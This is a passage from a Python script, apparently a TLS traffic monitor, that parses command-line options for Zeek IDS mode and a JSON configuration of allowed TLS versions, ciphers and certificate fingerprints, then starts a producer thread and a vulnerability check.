                print("FULL VERSION")
                full_version = 1
            if any(arg in sys.argv for arg in ["--IDS=Zeek", "--IDS=zeek", '--zeek', '--Zeek']):
                print("ZEEK IDS")
                IDS = "ZEEK"
            if "--json" in sys.argv:
                print("JSON")
                i = sys.argv.index("--json")
                with open(sys.argv.pop(i + 1)) as file:
                    json_format = json.load(file)
                    versions_config = json_format['versions']
                    ciphers_config = json_format['ciphers']
                    certificate_fingerprint_config = json_format.get('certificate_fingerprint', [])
                    for idx in range(len(certificate_fingerprint_config)):
                        certificate_fingerprint_config[idx] = certificate_fingerprint_config[idx].replace(':',
                                                                                                          '').lower()
                    config_input = True
            try:
                producer()
                log_print('Producer thread is started...')
                verifica_vulnerabilita()
            except (KeyboardInterrupt, SystemExit):
                print("End of the program")
                sys.exit()
